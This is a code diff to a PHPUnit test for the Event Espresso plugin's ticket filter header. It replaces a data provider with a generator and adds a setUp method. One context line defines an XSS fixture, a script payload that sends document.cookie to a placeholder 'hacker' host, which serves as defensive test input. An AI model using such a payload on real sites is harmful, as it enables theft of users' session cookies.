@@ -10,9 +10,9 @@ use EventEspresso\core\domain\services\admin\registrations\list_table\page_heade
 use EventEspresso\core\exceptions\InvalidDataTypeException;
 use EventEspresso\core\exceptions\InvalidInterfaceException;
 use EventEspresso\tests\mocks\core\services\request\RequestMock;
+use Generator;
 use InvalidArgumentException;
 use PHPUnit\Framework\AssertionFailedError;
-use PHPUnit\Framework\Exception;
 use PHPUnit\Framework\TestCase;
 use ReflectionException;
 
@@ -37,6 +37,20 @@ class TicketFilterHeaderTest extends TestCase
      */
     private $xss = '"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>';
 
+
+    /**
+     * @throws AssertionFailedError
+     * @throws EE_Error
+     * @throws InvalidArgumentException
+     * @throws InvalidDataTypeException
+     * @throws InvalidInterfaceException
+     * @throws ReflectionException
+     * @since $VID:$
+     */
+    public function setUp()
+    {
+        $this->setUpTickets();
+    }
 
     /**
      * @throws EE_Error
@@ -96,24 +110,22 @@ class TicketFilterHeaderTest extends TestCase
 
 
     /**
-     * returns following parameters:
-     *      $get_params array of simulated $_GET params
-     *      $existing_text existing header text
-     *      $expected   value of $header_text
+     * generator function to replace phpunit's dataProvider
+     * because those run during initial phpunit setup
+     * and NOT when this actual test class is run,
+     * therefore making it impossible to create
+     * and save entities to the database in order to use
+     * their autoincrement IDs in this function
+     * and have those entities still exist when these
+     * testcases actually run.
      *
-     * @return array
+     * @return Generator
      * @throws EE_Error
-     * @throws InvalidArgumentException
-     * @throws InvalidDataTypeException
-     * @throws InvalidInterfaceException
-     * @throws ReflectionException
-     * @throws Exception
      * @since  $VID:$
      */
-    public function testDataProvider()
+    public function testDataGenerator()
     {
-        $this->setUpTickets();
-        return [
+        $test_data = [
             // empty array
             [[], ''],
             // invalid keys
@@ -143,26 +155,28 @@ class TicketFilterHeaderTest extends TestCase
                 '<h3 style="line-height:1.5em;">Viewing registrations for ticket:&nbsp; &nbsp; <span class="drk-grey-text" style="font-size:.9em;"><span class="dashicons dashicons-tickets-alt"></span><span class="ee-ticket-name">I am not Groot... I am Free!</span> <span class="reg-overview-free-event-spn">free</span></span></h3>'
             ],
         ];
+        foreach ($test_data as $data) {
+            yield $data;
+        }
     }
 
 
     /**
-     * @dataProvider testDataProvider
-     * @param array  $get_params
-     * @param string $expected
      * @throws EE_Error
      * @throws InvalidDataTypeException
      * @throws InvalidInterfaceException
      * @throws ReflectionException
      * @throws InvalidArgumentException
-     * @since        $VID:$
+     * @since  $VID:$
      */
-    public function testGetHeaderText(array $get_params, $expected)
+    public function testGetHeaderText()
     {
-        $ticket_filter_header = $this->getTicketFilterHeader($get_params);
-        $header_text = $ticket_filter_header->getHeaderText();
-        // strip out nonce since it constantly changes
-        $header_text = preg_replace('/&edit_nonce=\S+"/', '&edit_nonce="', $header_text);
-        $this->assertEquals($expected, $header_text);
+        foreach ($this->testDataGenerator() as list($get_params, $expected)) {
+            $ticket_filter_header = $this->getTicketFilterHeader($get_params);
+            $header_text = $ticket_filter_header->getHeaderText();
+            // strip out nonce since it constantly changes
+            $header_text = preg_replace('/&edit_nonce=\S+"/', '&edit_nonce="', $header_text);
+            $this->assertEquals($expected, $header_text);
+        }
     }
 }
